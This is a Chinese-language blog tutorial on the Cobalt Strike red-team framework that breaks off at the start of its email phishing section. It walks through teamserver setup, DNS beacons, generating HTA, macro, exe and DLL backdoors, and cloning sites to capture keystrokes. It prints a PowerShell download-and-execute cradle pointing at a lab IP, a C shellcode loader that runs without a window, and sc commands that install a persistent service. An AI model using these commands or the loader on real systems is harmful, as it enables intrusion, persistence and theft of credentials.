{"title":"CobaltStrike","uid":"2c775c9f2810157671c3686070ee9f85","slug":"CobaltStrike","date":"2022-10-06T14:02:27.000Z","updated":"2022-10-06T14:03:06.563Z","comments":true,"path":"api/articles/CobaltStrike.json","keywords":null,"cover":"https://picb.zhimg.com/v2-03cbff5f588c507b48be6485313f8b3b_r.jpg?source=1940ef5c","content":"<h1 id=\"1-cobalt-strike介绍\"><a class=\"markdownIt-Anchor\" href=\"#1-cobalt-strike介绍\">#</a> 1、Cobalt Strike 介绍</h1>\n<h2 id=\"11-介绍\"><a class=\"markdownIt-Anchor\" href=\"#11-介绍\">#</a> 1.1 介绍</h2>\n<ul>\n<li>Cobalt Strike 是一款基于 java 的渗透测试神器，常被业界人称为 CS 神器。自 3.0 以后已经不在使用 Metasploit 框架而作为一个独立的平台使用，分为客户端与服务端，服务端是一个，客户端可以有多个，非常适合团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和 sessions，可模拟 APT 做模拟对抗，进行内网渗透。</li>\n<li>Cobalt Strike 集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等。</li>\n</ul>\n<h2 id=\"12-目录结构\"><a class=\"markdownIt-Anchor\" href=\"#12-目录结构\">#</a> 1.2 目录结构</h2>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">│ agscript 拓展应用的脚本\n│ c2lint 检查profile的错误异常\n│ cobaltstrike\n│ cobaltstrike.jar 客户端程序\n│ icon.jpg\n│ license.pdf\n│ readme.txt\n│ releasenotes.txt\n│ teamserver 服务端程序\n│ update\n│ update.jar\n│\n└─third-party 第三方工具\n    README.vncdll.txt\n    vncdll.x64.dll\n    vncdll.x86.dll<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"13-个人定制\"><a class=\"markdownIt-Anchor\" href=\"#13-个人定制\">#</a> 1.3 个人定制</h2>\n<ul>\n<li>Cobalt Strike 可以使用 AggressorScripts 脚本来加强自身，能够扩展菜单栏，Beacon 命令行，提权脚本等</li>\n<li>Cobalt Strike 通信配置文件是 Malleable C2 你可以修改 CS 的通讯特征，Beacon payload 的一些行为</li>\n<li>Cobalt Strike 可以引用其他的通讯框架 ExternalC2，ExternalC2 是由 Cobalt Strike 提出的一套规范 / 框架，它允许黑客根据需要对框架提供的默认 HTTP (S)/DNS/SMB C2 通信通道进行扩展</li>\n</ul>\n<h2 id=\"14-启动运行\"><a class=\"markdownIt-Anchor\" href=\"#14-启动运行\">#</a> 1.4 启动运行</h2>\n<ul>\n<li>cobalt strike 的团队服务器最好运行在 linux 平台上，服务端的关键文件是 teamserver 和 cobaltstrike.jar，解压时要将这两个文件放到同一目录下</li>\n<li>可以通过编辑 <code>./teamserver</code>  文件对启动的端口进行修改</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923203719117.png\" alt=\"image-20220923203719117\"></p>\n<ul>\n<li><mark>服务端</mark>启动命令 (若无法运行在 Linux 中执行 <code>chmod o+x teamserver</code> )</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> ./teamserver <span class=\"token operator\">&lt;</span>HOST<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>PASSWORD<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span>/path/to/c2.profile<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>YYYY-MM-DD<span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#例如：</span>\n<span class=\"token function\">sudo</span> ./teamserver <span class=\"token number\">10.10</span>.10.132 <span class=\"token number\">123456</span> <span class=\"token comment\">#一定使用强密码，放在公网会被爆破</span>\n<span class=\"token comment\"># 参数说明</span>\n<span class=\"token operator\">&lt;</span>host<span class=\"token operator\">></span> 必需参数 团队服务器IP\n<span class=\"token operator\">&lt;</span>password<span class=\"token operator\">></span> 必需参数 连接服务器的密码\n<span class=\"token punctuation\">[</span>/path/to/c2.profile<span class=\"token punctuation\">]</span> 可选参数 指定C2通信配置文件，体现其强大的扩展性\n<span class=\"token punctuation\">[</span>YYYY-MM-DD<span class=\"token punctuation\">]</span> 可选参数 所有payload的终止时间\n<span class=\"token comment\">#放置到后台运行</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">nohup</span> ./teamserver <span class=\"token number\">10.10</span>.10.132 <span class=\"token number\">123456</span> <span class=\"token operator\">&amp;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><mark>客户端</mark>启动 —— 注意第一次连接会有指纹提示</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#windows端直接双击start.bat</span>\n<span class=\"token comment\">#linux：</span>\n<span class=\"token function\">sudo</span> ./cobaltstrike \n<span class=\"token comment\">#如果无执行权限使用chmod o+x cobaltstrike</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923204413073.png\" alt=\"image-20220923204413073\"></p>\n<h2 id=\"15-偏好设置\"><a class=\"markdownIt-Anchor\" href=\"#15-偏好设置\">#</a> 1.5 偏好设置</h2>\n<ul>\n<li>客户端每次连接都会自动保存配置文件，可以在偏好设置删除没用的连接信息</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923204552017.png\" alt=\"image-20220923204552017\"></p>\n<h2 id=\"16-参数说明\"><a class=\"markdownIt-Anchor\" href=\"#16-参数说明\">#</a> 1.6 参数说明</h2>\n<p><strong>Cobalt Strike</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">New Connection # 新建连接，支持连接多个服务器端\nPreferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录\nVisualization # 主要展示输出结果的视图\nVPN Interfaces # 设置VPN接口\nListenrs # 创建监听器\nScript Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等\nClose # 退出连接<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>View</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">New Connection # 新建连接，支持连接多个服务器端\nPreferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录\nVisualization # 主要展示输出结果的视图\nVPN Interfaces # 设置VPN接口\nListenrs # 创建监听器\nScript Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等\nClose # 退出连接<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><em><strong>Attacks</strong></em></p>\n<p><strong>Packages</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">HTML Application # 生成(executable&#x2F;VBA&#x2F;powershell)这三种原理实现的恶意HTA木马文件\nMS Office Macro # 生成office宏病毒文件\nPayload Generator # 生成各种语言版本的payload\nUSB&#x2F;CD AutoPlay # 生成利用自动播放运行的木马文件\nWindows Dropper # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)\nWindows Executable # 生成可执行exe木马\nWindows Executable(Stageless) # 生成无状态的可执行exe木马<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>Web Drive-by</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Manage # 对开启的web服务进行管理\nClone Site # 克隆网站，可以记录受害者提交的数据\nHost File # 提供文件下载，可以选择Mime类型\nScripted Web Delivery # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery\nSigned Applet Attack # 使用java自签名的程序进行钓鱼攻击(该方法已过时)\nSmart Applet Attack # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java1.7.0_21以下版本(该方法已过时)\nSystem Profiler # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等\nSpear Phish # 鱼叉钓鱼邮件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>Reporting</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Activity Report # 活动报告\nHosts Report # 主机报告\nIndicators of Compromise # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5hashes\nSessions Report # 会话报告\nSocial Engineering Report # 社会工程报告：包括鱼叉钓鱼邮件及点击记录\nTactics, Techniques, and Procedures # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略\nReset Data # 重置数据\nExport Data # 导出数据，导出.tsv文件格式<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>Help</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Homepage # 官方主页\nSupport # 技术支持\nArsenal # 开发者\nSystem information # 版本信息\nAbout # 关于<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><strong>工具栏</strong></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923204900401.png\" alt=\"image-20220923204900401\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1.新建连接\n2.断开当前连接\n3.监听器\n4.改变视图为Pivot Graph(视图列表)\n5.改变视图为Session Table(会话列表)\n6.改变视图为Target Table(目标列表)\n7.显示所有以获取的受害主机的凭证\n8.查看已下载文件\n9.查看键盘记录结果\n10.查看屏幕截图\n11.生成无状态的可执行exe木马\n12.使用java自签名的程序进行钓鱼攻击\n13.生成office宏病毒文件\n14.为payload提供web服务以便下载和执行\n15.提供文件下载，可以选择Mime类型\n16.管理Cobalt Strike上运行的web服务\n17.帮助\n18.关于<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"2-基础使用上线\"><a class=\"markdownIt-Anchor\" href=\"#2-基础使用上线\">#</a> 2、基础使用上线</h1>\n<ul>\n<li>执行 ```sudo ./cobaltstrike`` 打开客户端，输入账号密码后登录</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923205012422.png\" alt=\"image-20220923205012422\"></p>\n<ul>\n<li>可在视图中打开事件日志</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923205116996.png\" alt=\"image-20220923205116996\"></p>\n<ul>\n<li>首先配置监听器，监听器可在上方菜单栏 cobaltstrike 中打开</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923205602782.png\" alt=\"image-20220923205602782\"></p>\n<pre class=\"line-numbers language-：\" data-language=\"：\"><code class=\"language-：\">#监听参数说明\n名字：随意，用于区分就好，可设置多个监听器\npayload：\n    Beacon DNS\n    Beacon HTTP\n    Beacon HTTPS\n    Beacon SMB\n    Beacon TCP\n    External C2\n    Foreign HTTP\n    Foreign HTTPS\n地址轮询策略：\n\tround-robin：按主机名的顺序循环浏览主机名列表\n\trandom：每次访问时，从列表中随机选择一个主机名尝试连接。\n\tfailover-xx：使用每台主机一段时间。指定的持续时间（m、h、d），然后使用下一个主机。\nHTTP地址：可以写IP也可以写域名，但是要求IP和域名都是对应的服务端的地址\n配置名称：default\nHTTP端口(上线)：监听器监听的上线端口，可自定义<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"21-http地址为域名\"><a class=\"markdownIt-Anchor\" href=\"#21-http地址为域名\">#</a> 2.1 HTTP 地址为域名</h2>\n<ul>\n<li>在域内使用域控主机添加了几条域名，IP 指向服务器地址</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923210054718.png\" alt=\"image-20220923210054718\"></p>\n<ul>\n<li>添加三个域名记录</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923210537735.png\" alt=\"image-20220923210537735\"></p>\n<ul>\n<li>生成后门并连接</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923210555748.png\" alt=\"image-20220923210555748\"></p>\n<h2 id=\"22-基础的windowsexe生成\"><a class=\"markdownIt-Anchor\" href=\"#22-基础的windowsexe生成\">#</a> 2.2 基础的 windows.exe 生成</h2>\n<ul>\n<li>点击攻击 -&gt; 生成后门 -&gt;windows 可执行程序，选择对应的监听器进行保存即可，可选用是否适用 64 位</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923210716989.png\" alt=\"image-20220923210716989\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923210739987.png\" alt=\"image-20220923210739987\"></p>\n<ul>\n<li>将生成的文件上传到被攻击主机上执行即可</li>\n</ul>\n<h1 id=\"3-dns上线\"><a class=\"markdownIt-Anchor\" href=\"#3-dns上线\">#</a> 3、dns 上线</h1>\n<ul>\n<li>如果在内网中防火墙只允许 dns 出网，在 cs 中有 dns 模块，可以使用 dns 使主机上线，<strong>需要使用公网服务器和域名</strong></li>\n<li>查询 dns 是否出网命令：<mark> <code>nslookup www.baidu,com</code> </mark>，返回结果如下说明可以出网</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211047340.png\" alt=\"image-20220923211047340\"></p>\n<ul>\n<li>设置一条 A 记录指向公网 IP，设置两条 ns 记录指向 A 记录</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211219310.png\" alt=\"image-20220923211219310\"></p>\n<ul>\n<li>建立 dns 监听</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211238138.png\" alt=\"image-20220923211238138\"></p>\n<ul>\n<li><strong>注意</strong>：因为 dns 的默认端口是 53 端口，在 ubuntu 的 53 端口默认是开启的，如果出现占用情况，先把 53 端口关闭</li>\n<li><a href=\"https://blog.csdn.net/qq_24924187/article/details/109197505\">(87 条消息) Linux systemd-resolve 占用 53 端口的解决方法_神尾观铃酱的博客 - CSDN 博客_systemd-resolved 占用 53 号端口</a></li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> systemctl stop systemd-resolved<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>使用攻击 -&gt;web 钓鱼 -&gt; 文件投递生成 payload，将 payload 在目标主机 powershell 中执行</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211447748.png\" alt=\"image-20220923211447748\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211534500.png\" alt=\"image-20220923211534500\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.10.132:80&#x2F;adfdf&#39;))&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>上线后是一个黑色图标，使用命令 <code>checkin</code>  强制目标回连并更新状态（用于 DNS 上线，DNS 模式下无新任务时目标不会回连 Teamserver）</li>\n<li>在 beacon 支持三种 dns 执行命令方式，一般使用 dns-txt 较多</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mode dns 使用DNS A记录作为数据通道（仅支持DNS上线Beacon）\nmode dns-txt 使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon）\nmode dns6 使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211649606.png\" alt=\"image-20220923211649606\"></p>\n<h1 id=\"4-生成后门模块使用\"><a class=\"markdownIt-Anchor\" href=\"#4-生成后门模块使用\">#</a> 4、生成后门模块使用</h1>\n<ul>\n<li>生成后门功能中共有以下几个模块</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211911580.png\" alt=\"image-20220923211911580\"></p>\n<h2 id=\"41-hta文档\"><a class=\"markdownIt-Anchor\" href=\"#41-hta文档\">#</a> 4.1 HTA 文档</h2>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923211931875.png\" alt=\"image-20220923211931875\"></p>\n<ul>\n<li>method 共有三种：executeable 可执行文件；powershell 命令行；VBA 配合 office，通常使用 PowerShell 配合文件投递使用，同时 powershell 便于制作免杀</li>\n<li>生成文件后使用文件托管进行投递文件</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923212117641.png\" alt=\"image-20220923212117641\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923212152988.png\" alt=\"image-20220923212152988\"></p>\n<ul>\n<li>设置好后会出现 powershell 的 payload，别人访问该网站就会上线</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;10.10.10.132:80&#x2F;download&#x2F;file.hta<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923212231939.png\" alt=\"image-20220923212231939\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220923212345237.png\" alt=\"image-20220923212345237\"></p>\n<h2 id=\"42-office宏\"><a class=\"markdownIt-Anchor\" href=\"#42-office宏\">#</a> 4.2 Office 宏</h2>\n<ul>\n<li>office 宏后门可将生成的 payload 放在 office 文件中，当打开这个文件并启用宏，电脑就会上线</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924144241107.png\" alt=\"image-20220924144241107\"></p>\n<ul>\n<li>生成后根据 cs 的提示进行操作即可，另存为的时候要注意选择文件类型</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924144335417.png\" alt=\"image-20220924144335417\"></p>\n<ul>\n<li>打开后可能会进行拦截，点击启用宏上线</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924144416792.png\" alt=\"image-20220924144416792\"></p>\n<h2 id=\"43-payload生成器\"><a class=\"markdownIt-Anchor\" href=\"#43-payload生成器\">#</a> 4.3 payload 生成器</h2>\n<ul>\n<li>cs 提供 payload 生成器，因为默认的 shellcode 容易被杀毒软件查杀，使用 shellcode 加载器运行 payload 更容易做免杀</li>\n<li>在 payload 生成器中可以选择各种语言的 payload</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924144537899.png\" alt=\"image-20220924144537899\"></p>\n<ul>\n<li>下面提供一个 C 语言生成 shellcode 的代码，使用 release 编译出 exe 后放到主机中执行上线</li>\n</ul>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">comment</span><span class=\"token punctuation\">(</span>linker<span class=\"token punctuation\">,</span></span><span class=\"token string\">\"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span><span class=\"token comment\">//不显示窗口</span></span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> shellcode<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\\xfc..\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span> #这个变量就是生成的payload\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    LPVOID Memory <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAlloc</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MEM_COMMIT <span class=\"token operator\">|</span> \tMEM_RESERVE<span class=\"token punctuation\">,</span> PAGE_EXECUTE_READWRITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Memory <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>Memory<span class=\"token punctuation\">,</span> shellcode<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>Memory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>** 注：** 编译记得使用 Release 模式而不是 Debug 生成 否则回出现错误</p>\n<h2 id=\"44-windows可执行程序\"><a class=\"markdownIt-Anchor\" href=\"#44-windows可执行程序\">#</a> 4.4 windows 可执行程序</h2>\n<ul>\n<li>windows 提供三种生成文件类型\n<ul>\n<li>windwos 可执行程序 直接双击运行</li>\n<li>windwos 服务程序 可以使用 sc 命令做成服务程序</li>\n<li>windows dll 文件</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"441-exe可执行程序\"><a class=\"markdownIt-Anchor\" href=\"#441-exe可执行程序\">#</a> 4.4.1 exe 可执行程序</h3>\n<ul>\n<li>生成后门后直接在目标主机运行文件即可上线</li>\n</ul>\n<h3 id=\"442-service-exe服务程序\"><a class=\"markdownIt-Anchor\" href=\"#442-service-exe服务程序\">#</a> 4.4.2 service exe 服务程序</h3>\n<ul>\n<li>在 cs 中生成服务程序</li>\n</ul>\n<pre class=\"line-numbers language-beacon\" data-language=\"beacon\"><code class=\"language-beacon\">shell sc create &quot;server1&quot; binpath&#x3D; &quot;C:\\WINDOWS\\Temp\\server1.exe&quot;\nshell sc description &quot;server1&quot; &quot;description&quot;\nshell sc config &quot;server1&quot; start&#x3D; auto\nshell net start &quot;server1&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924144910067.png\" alt=\"image-20220924144910067\"></p>\n<p>执行之后是 system 权限，这也是一种留后门的方法</p>\n<h3 id=\"443-windows-dll文件\"><a class=\"markdownIt-Anchor\" href=\"#443-windows-dll文件\">#</a> 4.4.3 windows dll 文件</h3>\n<ul>\n<li>\n<p>windows dll 文件：</p>\n<ul>\n<li>\n<p>在 windows 的 system 文件夹下有一个 regsvr32.exe 的程序，它就是 windows 自带的 activex 注册和反注 册工具。(activex 不注册是不能够被系统识别和使用的，一般安装程序都会自动地把它所使用的 activex 控件注册)。Regsvr32 命令用于注册 COM 组件，是 Windows 系统提供的用来向系统注册控件或者卸载 控件的命令，以命令行方式运行。</p>\n</li>\n<li>\n<p>regsvr32</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&quot;regsvr32 [&#x2F;s] [&#x2F;n] [&#x2F;i(:cmdline)] dllname”。\n其中dllname为activex控件文件名，建议在安装前拷贝到system文件夹下。\n参数有如下意义：\n&#x2F;u——反注册控件（卸载com组建）\n&#x2F;s——不管注册成功与否，均不显示提示框（静默模式，不弹框）\n&#x2F;c——控制台输出\n&#x2F;i——跳过控件的选项进行安装(传给DllInstall的参数内容，regsvr32 允许注册过程中 dll 进行一些自定义的安装过程，该过程在 DllInstall 中实现。)\n&#x2F;n——不注册控件，此选项必须与&#x2F;i选项一起使用\nScrobj.dll:com服务器，全名Windows Script Component,DllInstall方法在这个组件中实现。\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924145042700.png\" alt=\"image-20220924145042700\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#执行文件\nc:\\Windows\\System32\\regsvr32.exe C:\\Windows\\Temp\\artifact.dll<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924145240689.png\" alt=\"image-20220924145240689\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924145301379.png\" alt=\"image-20220924145301379\"></p>\n<h1 id=\"5-web钓鱼模块\"><a class=\"markdownIt-Anchor\" href=\"#5-web钓鱼模块\">#</a> 5、Web 钓鱼模块</h1>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Manage 对开启的web服务进行管理；\nClone Site 克隆网站，可以记录受害者提交的数据；\nHost File 提供一个文件下载，可以修改Mime信息；\nScripted Web Delivery 类似于msf 的web_delivery ;\nSigned Applet Attack 使用java自签名的程序进行钓鱼攻击;\nSmart Applet Attack 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本；\nSystem Profiler 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"51-站点管理\"><a class=\"markdownIt-Anchor\" href=\"#51-站点管理\">#</a> 5.1 站点管理</h2>\n<ul>\n<li>凡是使用 web 钓鱼进行文件托管或生成的 powershell payload 等都会在 web 站点管理中有记录，可进行复制 URL、删除等操作</li>\n<li>添加了 IP 和端口的记录可进行访问下载文件</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924145638681.png\" alt=\"image-20220924145638681\"></p>\n<h2 id=\"52-克隆网站\"><a class=\"markdownIt-Anchor\" href=\"#52-克隆网站\">#</a> 5.2 克隆网站</h2>\n<ul>\n<li>克隆网站可以克隆一个登录页面记录受害者的<mark>键盘输入</mark>，也可以附加文件，受害者在访问该网站时会<mark>自动下载文件</mark>进行上线</li>\n<li>如：某人博客，下图为正常网站 URL</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924150652309.png\" alt=\"image-20220924150652309\"></p>\n<ul>\n<li>生成克隆站点</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924150727710.png\" alt=\"image-20220924150727710\"></p>\n<ul>\n<li>访问后可抓取键盘输入（<mark>在视图 ----web 日志中查看</mark>）</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924150811752.png\" alt=\"image-20220924150811752\"></p>\n<h1 id=\"6-邮件钓鱼\"><a class=\"markdownIt-Anchor\" href=\"#6-邮件钓鱼\">#</a> 6、邮件钓鱼</h1>\n<ul>\n<li>首先需要准备一个.eml 